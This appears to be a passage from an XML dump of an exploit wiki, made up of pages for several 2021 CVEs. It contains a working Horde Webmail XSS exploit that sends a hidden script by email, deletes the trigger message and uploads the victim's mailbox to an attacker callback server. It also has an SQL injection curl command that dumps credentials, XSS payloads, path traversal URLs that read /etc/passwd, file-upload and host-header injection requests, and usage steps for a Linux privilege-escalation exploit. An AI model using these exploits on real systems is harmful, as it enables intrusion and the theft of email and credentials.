Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------
Content-Length: 333
Origin: https://probot.io
DNT: 1
Connection: close
Referer: https://probot.io/server/""/welcomer

-----------------------------
Content-Disposition: form-data; name="file"; filename="ste.html.jpg"
Content-Type: text/html

&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;bypasss&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div&gt;bypass&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;

-------------------------------

Note:the link of the file will be generated depend on the content type in this case .html

# Impact
Unrestricted file uploads can be abused to exploit other vulnerable sections of an application when a file on the same or a trusted server is needed (can again lead to client-side or server-side attacks)

#Solution
File types should be restricted to only jpg ,png ,jpeg  (text/img)
&lt;/pre&gt;</text>
      <sha1>kqgtw88kimnzrxiw80mqe5rpqn4rsee</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26929 Webmail Edition 5.2.22 XSS&amp;遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1333</id>
    <revision>
      <id>1673</id>
      <timestamp>2021-04-15T03:22:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python3 # debug nu11secur1ty 2021 import io import os import ssl import sys import json import base64 import string import random import logging impor..."</comment>
      <origin>1673</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10531" sha1="e07jsi1kkhjxsqtnc8htsvfmxbqmwv9" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python3
# debug nu11secur1ty 2021
import io
import os
import ssl
import sys
import json
import base64
import string
import random
import logging
import smtplib
import sqlite3
import hashlib
import zipfile
import argparse
from flask import Flask, request, Response
from urllib.parse import urlparse
 
class Exploit:
    def __init__(self, args):
        # Database
        if not os.path.exists('database.db'):
            with sqlite3.connect("database.db") as conn:
                cursor = conn.cursor()
                cursor.execute('CREATE TABLE mailbox (hash TEXT NOT NULL
UNIQUE, content BLOB NOT NULL);')
                conn.commit()
        # SMTP URL
        o = urlparse(args.smtp)
        self.smtp = {
            'ssl': o.scheme.lower() == 'smtps',
            'host': o.hostname or '127.0.0.1',
            'port': o.port or ('465' if o.scheme.lower() == 'smtps' else
'25'),
            'username': '' or o.username,
            'password': '' or o.password
        }
        try:
            if self.smtp['ssl']:
                context = ssl.create_default_context()
                context.verify_mode = ssl.CERT_OPTIONAL
                context.check_hostname = False
                self.server = smtplib.SMTP_SSL(self.smtp['host'],
self.smtp['port'], context=context)
            else:
                self.server = smtplib.SMTP(self.smtp['host'],
self.smtp['port'])
        except Exception as e:
            print(e)
            print('[-] Error connecting to SMTP server!')
            exit()
        try:
            self.server.login(self.smtp['username'], self.smtp['password'])
        except:
            pass
        # Callback URL
        o = urlparse(args.callback)
        self.callback = {
            'url': '{}://{}'.format(o.scheme, o.netloc),
            'path': ''.join(random.choice(string.ascii_letters) for i in
range(20))
        }
        # Listener URL
        o = urlparse(args.listener)
        self.listener = {
            'ssl': o.scheme.lower() == 'https',
            'host': o.hostname or '0.0.0.0',
            'port': o.port or 80,
            'horde': ''.join(random.choice(string.ascii_letters) for i in
range(20))
        }
        # Target email
        self.target = args.target
        # Subject
        self.subject = args.subject or 'Important Message'
        # Environment
        self.env = {}
        self.env['mailbox'] = args.mailbox or 'INBOX'
        self.env['callback'] = '{}/{}'.format(self.callback['url'],
self.callback['path'])
 
    def trigger(self):
        print('[*] Waiting for emails...')
        self.bypass_auth()
        print('\n[*] Done')
 
    def bypass_auth(self):
        def horde():
            f = open('horde.js')
            content = 'env = {};\n\n{}'.format(json.dumps(self.env),
f.read())
            f.close()
            return content
 
        def callback():
            response = Response('')
            with sqlite3.connect("database.db") as conn:
                try:
                    if request.files.get('mbox'):
                        filename =
request.files.get('mbox').filename.replace('zip', 'mbox')
                        content = request.files.get('mbox').stream.read()
                        zipdata = io.BytesIO()
                        zipdata.write(content)
                        content = zipfile.ZipFile(zipdata)
                        content = content.open(filename).read()
                        mail_hash =  hashlib.sha1(content).digest().hex()
                        print('[+] Received mailbox
({})'.format(mail_hash))
                        cursor = conn.cursor()
                        cursor.execute('INSERT INTO mailbox (hash, content)
VALUES (?, ?)', (mail_hash, content))
                except:
                    pass
            response.headers['Access-Control-Allow-Origin'] = '*'
            return response
 
        payload = 'var
s=document.createElement("script");s.type="text/javascript";s.src="{}/{}";document.head.append(s);'.format(self.callback['url'],
self.listener['horde'])
        payload =
'&lt;script&gt;eval(atob("{}"))&lt;/script&gt;'.format(base64.b64encode(payload.encode('latin-1')).decode('latin-1'))
        content = 'Subject: {}\nFrom: {}\nTo: {}\n'.format(self.subject,
self.smtp['username'], self.target)
        # The secret services :)
        content +=
'X\x00\x00\x00{}\x00\x00\x00X'.format(base64.b64encode(payload.encode('latin-1')).decode('latin-1'))
        self.server.sendmail(self.smtp['username'], self.target, content)
        app = Flask(__name__)
        app.add_url_rule('/{}'.format(self.listener['horde']), 'horde',
horde)
        app.add_url_rule('/{}'.format(self.callback['path']), 'callback',
callback, methods=['POST'])
        logging.getLogger('werkzeug').setLevel(logging.ERROR)
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None
        try:
            if self.listener['ssl']:
                app.run(host=self.listener['host'],
port=self.listener['port'], ssl_context=('cert.pem', 'key.pem'))
            else:
                app.run(host=self.listener['host'],
port=self.listener['port'])
        except:
            pass
 
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--smtp', help='SMTP URL', required=True,
metavar='URL')
    parser.add_argument('--callback', help='Callback URL', required=True,
metavar='URL')
    parser.add_argument('--listener', help='Listener URL', metavar='URL')
    parser.add_argument('--target', help='Target email', required=True,
metavar='EMAIL')
    parser.add_argument('--subject', help='Email subject',
metavar='SUBJECT')
    parser.add_argument('--mailbox', help='Mailbox from which to steal the
emails', metavar='INBOX')
    args = parser.parse_args()
    exploit = Exploit(args)
    exploit.trigger()
horde.js
 
class Exploit {
    constructor() {
        this.basepath = document.location.pathname.substring(0,
document.location.pathname.indexOf('imp'));
    }
 
    trigger() {
        this.mailbox = this.get_mailbox();
        this.buid = this.get_buid();
        this.token = this.get_token();
        this.auto_delete()
        .then(() =&gt; {
            this.exfiltrate_emails({mailbox: env.mailbox});
        });
    }
 
    async auto_delete() {
        let params = new URLSearchParams()
        params.append('token', this.token);
        params.append('view', this.mailbox);
        params.append('buid', this.buid);
        return fetch(this.basepath +
'services/ajax.php/imp/deleteMessages', {
            method: 'POST',
            body: params
        })
        .then(() =&gt; {
            let params = new URLSearchParams();
            params.append('token', this.token);
            params.append('view', this.mailbox);
            return fetch(this.basepath +
'services/ajax.php/imp/purgeDeleted', {
                method: 'POST',
                body: params
            })
            .then(() =&gt; {
                if (document.getElementById('checkmaillink') !== null) {
                    document.getElementById('checkmaillink').click();
                }
            });
        });
    }
 
    async exfiltrate_emails(args) {
        let mbox_list = '["' + this.get_mailbox() + '"]';
        if (args.mailbox.toUpperCase() != 'INBOX') {
            let params = new URLSearchParams();
            params.append('reload', '1');
            params.append('unsub', '1');
            params.append('token', this.token);
            let mailboxes = await fetch(this.basepath +
'services/ajax.php/imp/listMailboxes', {
                method: 'POST',
                body: params
            })
            .then(response =&gt; {
                return response.text();
            })
            .then(data =&gt; {
                return JSON.parse(data.substring(10, data.length - 2));
 
            });
            mailboxes.tasks['imp:mailbox'].a.forEach(mailbox =&gt; {
                if (mailbox.l.toUpperCase() == args.mailbox) {
                    if (mbox_list === undefined) {
                        mbox_list = '["' + mailbox.m + '"]';
                    }
                }
            });
        }
        let zip = await fetch(this.basepath +
'services/download/?app=imp&amp;actionID=download_mbox&amp;mbox_list=' + mbox_list
+ '&amp;type=mboxzip&amp;token=' + this.token + '&amp;fn=/')
        .then(response =&gt; {
            return [response.blob(),
response.headers.get('Content-Disposition')];
        });
        let filename = zip[1];
        filename = filename.substring(filename.indexOf('filename="') + 10,
filename.length - 1);
        zip = await zip[0];
        let formData = new FormData();
        formData.append('mbox', zip, filename);
        fetch(window.env.callback, {
            method: 'POST',
            body: formData
        });
    }
 
    get_token() {
        let link;
        let token;
        if (document.getElementsByClassName('smartmobile-logout').length &gt;
0) {
            link =
document.getElementsByClassName('smartmobile-logout')[0].href;
        }
        else if (document.getElementById('horde-logout') !== null) {
            link =
document.getElementById('horde-logout').getElementsByTagName('a')[0].href;
        }
        else {
            link = location.href;
        }
        if (link.match('horde_logout_token=(.*)&amp;') !== null) {
            token = link.match('horde_logout_token=(.*)&amp;')[1];
        }
        if (token === undefined &amp;&amp; link.match('token=(.*)&amp;') !== null) {
            token = link.match('token=(.*)&amp;')[1];
        }
        return token;
    }
 
    get_mailbox() {
        if (window.DimpBase !== undefined) {
            return
DimpBase.viewport.getSelection(DimpBase.pp.VP_view).search({
                VP_id: {
                    equal: [ DimpBase.pp.VP_id ]
                }
            }).get('dataob').first().VP_view;
        }
        else if (location.href.match('mailbox=([A-Za-z0-9]*)') !== null) {
            return location.href.match('mailbox=([A-Za-z0-9]*)')[1];
        }
        else if (location.href.match('mbox=([A-Za-z0-9]*)') !== null) {
            return location.href.match('mbox=([A-Za-z0-9]*)')[1];
        }
    }
 
    get_buid() {
        if (location.href.match('buid=([0-9]*)') !== null) {
            return location.href.match('buid=([0-9]*)')[1];
        }
        else if (location.href.match(';([0-9]*)') !== null) {
            return location.href.match(';([0-9]*)')[1];
        }
    }
}
 
const exploit = new Exploit();
exploit.trigger();
&lt;/pre&gt;</text>
      <sha1>e07jsi1kkhjxsqtnc8htsvfmxbqmwv9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27124 Doctor Appointment System 1.0 SQL注入漏洞</title>
    <ns>0</ns>
    <id>3133</id>
    <revision>
      <id>3636</id>
      <timestamp>2021-05-30T03:01:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Doctor Appointment System 1.0 - Authenticated SQL Injection # Date: 2021-02-09 # Exploit Author: Soham Bakore, Nakul Ratti # Vendor Homepage: https://ww..."</comment>
      <origin>3636</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1366" sha1="f3n4qv78t9tatw1q1sz9os6ug96xj41" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Doctor Appointment System 1.0 - Authenticated SQL Injection
# Date: 2021-02-09
# Exploit Author: Soham Bakore, Nakul Ratti
# Vendor Homepage:
https://www.sourcecodester.com/php/14182/doctor-appointment-system.html
# Software Link:
https://www.sourcecodester.com/php/14182/doctor-appointment-system.html
# Version: V1.0


Vulnerable File:
----------------
http://host/patient/search_result.php

Vulnerable Issue:
-----------------
Expertise parameter has no input validation

POC:
----
1] Login as a normal patient user
2] Insert cookie after successful login in the below command:
curl -i -s -o tmp -k -X $'POST' \
    -H $'Host: 192.168.1.12' -H $'Content-Type:
application/x-www-form-urlencoded' -H $'Content-Length: 288' -H
$'Connection: close' -H $'Cookie: PHPSESSID=b85jccq5ns65d75g69j2uj37hf' -H
$'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=b85jccq5ns65d75g69j2uj37hf' \
    --data-binary
$'expertise=Bone\'+union+select+concat(\'Username-\',username),2,3,(select+(%40a)+from+(select(%40a%3a%3d0x00),(select+(%40a)+from+(information_schema.schemata)where+(%40a)in+(%40a%3a%3dconcat(%40a,schema_name,\'&lt;br&gt;\'))))a),concat(\'Password\',\'-\',password),6,7,8,9,10,11,12+from+users%23&amp;submit='
\
    $'http://host/patient/search_result.php'
3] Check the tmp file for sensitive information from the database.
------------------
&lt;/pre&gt;</text>
      <sha1>f3n4qv78t9tatw1q1sz9os6ug96xj41</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27190 PEEL SHOPPING 9.3.0 XSS漏洞</title>
    <ns>0</ns>
    <id>598</id>
    <revision>
      <id>812</id>
      <timestamp>2021-03-31T07:42:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2021-27190 - PEEL Shopping, eCommerce shopping cart - Stored Cross-Site Scripting Vulnerability in 'Address'  [![Watch the video](https://i.imgur.com/UsFU..."</comment>
      <origin>812</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2236" sha1="4e4dt8izp4cezmviqhir0lwoe6qcate" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2021-27190 - PEEL Shopping, eCommerce shopping cart - Stored Cross-Site Scripting Vulnerability in 'Address'

[![Watch the video](https://i.imgur.com/UsFUHok.png)](https://drive.google.com/file/d/1t1hksDsYqYsqryRq61tNIQQMTCFidtc1/view)


## Date

2021-02-11 &lt;br /&gt;

## Exploit Author
Anmol K Sachan &lt;br /&gt;

## Vendor Homepage
https://www.peel.fr/ &lt;br /&gt;

## Software Link
https://www.peel.fr/nos-offres-1/peel-shopping-31.html &lt;br /&gt;
https://sourceforge.net/projects/peel-shopping/ &lt;br /&gt;

## Vulnerable Software Link
https://drive.google.com/file/d/1dIwRdaqtEyqUUgxbRqrHiS5WQ10nEG8z/view?usp=sharing &lt;br /&gt;

## Software: : 
PEEL SHOPPING 9.3.0 &lt;br /&gt;

## Vulnerability Type
Stored Cross-site Scripting &lt;br /&gt;

## Vulnerability
Stored XSS &lt;br /&gt;

## Tested on Windows 10 XAMPP 
&lt;br /&gt;

## CVE Assigned 
CVE-2021-27190 &lt;br /&gt;
This application is vulnerable to Stored XSS vulnerability. &lt;br /&gt;

## Vulnerable script
http://localhost/peel-shopping_9_3_0/utilisateurs/change_params.php &lt;br /&gt;

https://github.com/anmolksachan/CVE-2021-27190-PEEL-Shopping-cart-9.3.0-Stored-XSS/edit/main/README.MD## Vulnerable parameters
'Address' &lt;br /&gt;

## Payload used &lt;br /&gt;
```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e``` 
&lt;br /&gt; 
## POC
https://drive.google.com/file/d/1t1hksDsYqYsqryRq61tNIQQMTCFidtc1/view &lt;br /&gt;
In the same page where we injected payload click on the text box to edit the address. &lt;br /&gt;
You will see your Javascript code (XSS) executed. &lt;br /&gt;

## Referneces
1. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27190&lt;br /&gt;
2. https://packetstormsecurity.com/files/161367/PEEL-Shopping-9.3.0-Cross-Site-Scripting.html&lt;br /&gt;
3. https://www.exploit-db.com/exploits/49553&lt;br /&gt;
4. https://www.secuneus.com/cve-2021-27190-peel-shopping-ecommerce-shopping-cart-stored-cross-site-scripting-vulnerability-in-address/&lt;br /&gt;
5. https://cxsecurity.com/issue/WLB-2021020054&lt;br /&gt;
6. https://nvd.nist.gov/vuln/detail/CVE-2021-27190

&lt;/pre&gt;


==Payload==
&lt;pre&gt;
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e

&lt;/pre&gt;</text>
      <sha1>4e4dt8izp4cezmviqhir0lwoe6qcate</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27308 4Images 1.8 XSS漏洞</title>
    <ns>0</ns>
    <id>3366</id>
    <revision>
      <id>3930</id>
      <timestamp>2021-06-04T01:16:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: 4Images 1.8 - 'redirect' Reflected XSS # Exploit Author: Piyush Patil # Vendor Homepage: https://www.4homepages.de/ # Software Link: https://www.4homepa..."</comment>
      <origin>3930</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="860" sha1="sicndxwev6lvr0tb141b97s9w4sxrl6" xml:space="preserve">&lt;pre&gt;
# Exploit Title: 4Images 1.8 - 'redirect' Reflected XSS
# Exploit Author: Piyush Patil
# Vendor Homepage: https://www.4homepages.de/
# Software Link: https://www.4homepages.de/?download=4images1.8.zip&amp;code=81da0c7b5208e172ea83d879634f51d6
# Version: 4Images Gallery 1.8
# Tested on: Windows 10 and Kali
# CVE : CVE-2021-27308

-Description:
A cross-site scripting (XSS) vulnerability in the admin login panel in 4images version 1.8 allows remote attackers to inject JavaScript via the "redirect" parameter.


-Steps to reproduce:
1- Goto 4images admin panel page (demo instance: https://localhost/4images/admin/index.php)
2- Enter the credentials , Turn on the intercept and click on "Login"
3- copy paste the XSS payload after redirect=./../admin/index.php%3Fsessionid=xxxxxPASTEPAYLOADHERE
4-Forward the request and you can see XSS is triggered.
&lt;/pre&gt;</text>
      <sha1>sicndxwev6lvr0tb141b97s9w4sxrl6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27328 Path Traversal on Yeastar TG400 GSM Gateway - 91.3.0.3漏洞</title>
    <ns>0</ns>
    <id>597</id>
    <revision>
      <id>811</id>
      <timestamp>2021-03-31T07:39:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ## Example * to get  firmware decrypting password  ``` http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect ``` * to get /etc..."</comment>
      <origin>811</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="276" sha1="4xqwwquuvylt1ul8vlkl5ezo7qyafzm" xml:space="preserve">==INFO==
&lt;pre&gt;
## Example
* to get  firmware decrypting password

```
http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect
```
* to get /etc/paswd

```
http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd
```
&lt;/pre&gt;</text>
      <sha1>4xqwwquuvylt1ul8vlkl5ezo7qyafzm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27330 Triconsole 3.75 XSS漏洞</title>
    <ns>0</ns>
    <id>3123</id>
    <revision>
      <id>3626</id>
      <timestamp>2021-05-30T02:45:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Triconsole 3.75 - Reflected XSS # Google Dork: inurl : /calendar/calendar_form.php # Date: 15/2/2021 # Exploit Author: Akash Chathoth # Vendor Homepage:..."</comment>
      <origin>3626</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="445" sha1="khysprn1g2yaxi94j1n4u8ny03b60qg" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Triconsole 3.75 - Reflected XSS
# Google Dork: inurl : /calendar/calendar_form.php
# Date: 15/2/2021
# Exploit Author: Akash Chathoth
# Vendor Homepage: http://www.triconsole.com/
# Software Link: http://www.triconsole.com/php/calendar_datepicker.php
# Version: &lt; 3.76 (14 February 2021)
# Tested on: 3.75
# CVE: 2021-27330

# Exploit : http://exapmle.com/calendar_form.php/"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;/pre&gt;</text>
      <sha1>khysprn1g2yaxi94j1n4u8ny03b60qg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27363 Linux內核提權漏洞</title>
    <ns>0</ns>
    <id>231</id>
    <revision>
      <id>363</id>
      <timestamp>2021-03-16T09:21:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  ==POC== https://github.com/VerSprite/NotQuite0DayFriday/tree/trunk/2021.03.12-linux-iscsi  ==Usage== &lt;pre&gt; sudo python3 detect_iscsi_vuln.py   sudo yum install..."</comment>
      <origin>363</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="266" sha1="e8exvj9e40fu2i87d2kovn2ji5ykdps" xml:space="preserve">&lt;languages  /&gt;

==POC==
https://github.com/VerSprite/NotQuite0DayFriday/tree/trunk/2021.03.12-linux-iscsi

==Usage==
&lt;pre&gt;
sudo python3 detect_iscsi_vuln.py 

sudo yum install -y make gcc

make

cp a.sh /tmp/

chmod + x /tmp/a.sh

./exploit

ls -l /tmp/proof

&lt;/pre&gt;</text>
      <sha1>e8exvj9e40fu2i87d2kovn2ji5ykdps</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27370 Monica 2.19.1 XSS漏洞</title>
    <ns>0</ns>
    <id>3124</id>
    <revision>
      <id>3627</id>
      <timestamp>2021-05-30T02:48:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Monica 2.19.1 - 'last_name' Stored XSS # Date: 22-02-2021 # Exploit Author: BouSalman # Vendor Homepage: https://www.monicahq.com/ # Software Link: http..."</comment>
      <origin>3627</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2784" sha1="48uc9mkt63xq0iwdn44mka02q38vbsb" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Monica 2.19.1 - 'last_name' Stored XSS
# Date: 22-02-2021
# Exploit Author: BouSalman
# Vendor Homepage: https://www.monicahq.com/
# Software Link: https://github.com/monicahq/monica/releases
# Version: Monica 2.19.1
# Tested on: Ubuntu 18.04
# CVE : CVE-2021-27370

POST /people HTTP/1.1
Host: 192.168.99.162
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 199
Origin: http://192.168.99.162
Connection: close
Referer: http://192.168.99.162/people/add
Cookie: remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjZBQ21CelczS1ZxS1dmMkNxWFBqN1E9PSIsInZhbHVlIjoiME01aDNSS2FHQ1lZdS9KSVlSL1pKdC9qcHRWRDVveWFvb0ZkUFB4cFlaSDhEclB3SG9UQ3BISzVoWFdYQUYrVkdpUVNkRUNlbUxFOTEyOC9Vb1ZaWFZTblpGOWlRVW9PR0FmSVhyL3JwUmgweU9hODlJWU5vNmQ3aDcrT084MjBoQU5Ednh0TWJ6dmxwS2NadFovMEdveko1V0RvbThXT2Jram1JVW5LcXdqUzl4alVBRDFBYXNjSEt3amRxbVFvQ3pMMGJZU2owWTZzWVp1ZURTNUtoRUlJMnVrV3NiVHRNRTU5YysvLzl2Zz0iLCJtYWMiOiI5MTc2NDAwZTY4NjVmZDg3NjM1YjY3NDRiMzFhMmRiYzIwMjFhODU4YWQyOWUwZmQzOTBlY2Y1ZTI0ODdiNzVkIn0%3D; laravel_token=eyJpdiI6InIwQ2RlQW9FRG5lanlOZmlXWXBRVEE9PSIsInZhbHVlIjoiUHhPNmZneXUydGVCZHlVMEI5cHpiTWI2OE5qajN5UVJXUmJHSFV1VGgya2NEbEJ6T3N0QVhKeUZwU0R4a05HWTgwNTNidTk4aGNXc3UzejY4WDJnaUJ0VUp1ekQ5cjVDc0hLSWpGTzc1ZWRRQ05Yem0vK3RZdEpOVHNQeE4rQ1orbXNJTXhWczJnMENYeGp6Q3NnOGU5TXhpZDd1bS9wRlBZS0xsYmpLSXJiMHhSVmU2NnBUMjdYS1RTQmJrNkU4cWNtZGJVdjFpaXp5a2YzdVZsWWxQMjBicDQxUGFjZlhGbmhCOHl2MkVXdzRoalNtbE9xL010clpZMGJNVmVQNWUzQlpsRFVKamlWQ2Jydk9sZWg3cHNKWVIvRW92alp0YURJcllXa08rTjA4Y2lvVzNHTXBrem11Q21xaW92cEwiLCJtYWMiOiI1YjM5NzViODhjNTk5MWUzNWFjZDg0ZWZmNjk1NjE3MzhhN2M0NGFjNWE3MzMyMGFhNTI2ZjgxMjE4OTRjZDg4In0%3D; XSRF-TOKEN=eyJpdiI6IkZFY1FLVEJFRXJMOWh6Vll1SW51akE9PSIsInZhbHVlIjoiRTVLRFZnOEovNk9XeFB2bXFQZnFlM0FxRU9QMVRxaHRhS3RzOHNpWm45K0xXV1FsbWhzV0RxUWd6bStxVXFBTHF1WlkrSklnSXoxbkFXK1JNcURhUHp6eTFOUHdLclFkTTEvUFhtTDgzVHA2RElFNnVuOWVyRGxCSGJmdzhJOXciLCJtYWMiOiIxOWNlMjkxMjM5ZTlmMDFiZjhiM2VlZjZjZmNmMmFmZDA4MzcyZjc3Yzg2MmQ2MWIwNTY2OTZlNjQyZDkzMjA0In0%3D; laravel_session=eyJpdiI6InBtUThtUFE1RzdvbW40ay8wdWJraXc9PSIsInZhbHVlIjoiS1hoVlJoNzFrYlpBUGRTL2V0YzVDRlR6dHl6NE12NjFxVTEvbXQwYTJnRUwyY3VQc2hOeWlkbUdyeEx5aDBnYlJER1BnbW52RXR0QWs1ZG00eWg0U2JNb3dIRTQ0aU9HK0JnTzE5eXQwUGlzbDNsbVFVa3RabWVQVzF4OXJsUTMiLCJtYWMiOiI3YmQwZDFkYjAwMzdlZTllODAzYjZmNzQ2YWI5NTMzMDY0ZWIzMWIyOWI4MjM4ODMzMDdhNjc2YTE4ZDViZDg0In0%3D
Upgrade-Insecure-Requests: 1

_token=afJRD6VqgCxIze3tGcCqzyeb3YaFka3fvjqV9YOx&amp;first_name=XSS+POC&amp;middle_name=&amp;last_name=%7B%7B+constructor.constructor%28%22alert%28document.cookie%29%22%29%28%29+%7D%7D&amp;nickname=&amp;gender=&amp;save=true
&lt;/pre&gt;</text>
      <sha1>48uc9mkt63xq0iwdn44mka02q38vbsb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27404 Askey RTF8115VW BR SV g11.11 RTF TEF001 V6.54 V014 XSS漏洞</title>
    <ns>0</ns>
    <id>596</id>
    <revision>
      <id>810</id>
      <timestamp>2021-03-31T07:37:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; **UNAUTHENTICATED Cross-Site Scripting - Askey Internet Fiber Modem**  Vendor: **Askey**    Software Version: **BR_SV_g11.11_RTF_TEF001_V6.54_V014**   Model: **..."</comment>
      <origin>810</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1486" sha1="audp4kf3mpodupholdenam3e7b5qnpl" xml:space="preserve">==INFO==
&lt;pre&gt;
**UNAUTHENTICATED Cross-Site Scripting - Askey Internet Fiber Modem**

Vendor: **Askey**   
Software Version: **BR_SV_g11.11_RTF_TEF001_V6.54_V014**  
Model: **RTF8115VW**   
Vulnerable Param: **curWebPage**  
Payload: ```";alert('xss')//```   
Not tested in other model/version.   

Via GET REQUEST
```
At the login request we can issue a GET Request:
http://x.x.x.x/cgi-bin/te_acceso_router.cgi?curWebPage=/settings-internet.asp";alert('xss')//&amp;loginUsername=admin&amp;loginPassword=admin

The Username and Password param, don't need to be valid.
``` 

![Alt text](/xssget.jpg?raw=true "Optional Title")


Via POST REQUEST
```
1) Setup your Proxy (Burp / ZAP / whatever) to intercept the Login request
2) Input the payload after the .asp page used by the curWebPage param
3) Forward the Request
```

The Final Request
```
POST /cgi-bin/te_acceso_router.cgi HTTP/1.1
Host: x.x.x.x
Origin: http://x.x.x.x
Cookie: _httpdSessionId_=ece9eb5b733f7cbc8198ce9b6ab995c2
Upgrade-Insecure-Requests: 1
Referer: http://x.x.x.x/login.asp
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Connection: close
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
Content-Length: 35

curWebPage=%2Fsettings-firewall.asp+payload
 &lt;!---curWebPage=%2Fsettings-firewall.asp";alert('xss')//---&gt;
```

``` 

&lt;/pre&gt;</text>
      <sha1>audp4kf3mpodupholdenam3e7b5qnpl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27404 Authenticated Host標頭注入漏洞</title>
    <ns>0</ns>
    <id>595</id>
    <revision>
      <id>809</id>
      <timestamp>2021-03-31T07:35:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; **Authenticated Host Header Injection - Askey Internet Fiber Modem**  Vendor: **Askey**    Software Version: **BR_SV_g11.11_RTF_TEF001_V6.54_V014**   Model: **R..."</comment>
      <origin>809</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="977" sha1="komw6fi1fh6n6q0h24g01cla04dedk4" xml:space="preserve">==INFO==
&lt;pre&gt;
**Authenticated Host Header Injection - Askey Internet Fiber Modem**

Vendor: **Askey**   
Software Version: **BR_SV_g11.11_RTF_TEF001_V6.54_V014**  
Model: **RTF8115VW**   
Vulnerable Header: **Host**  
Not tested in other model/version.   

Impact: An attacker could take advantege on that vulnerability to redirect user to a fake Login page in order to extract his credentials, or cookies.

The Final Request
```
GET / HTTP/1.1
Host: kay4tb35bh55y38n8h4teim21t7jv8.burpcollaborator.net
Cookie: _httpdSessionId_=7924107467ea5838a196b65306ca7236
Upgrade-Insecure-Requests: 1
Referer: http://x.x.x.x/cgi-bin/te_logout.cgi
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
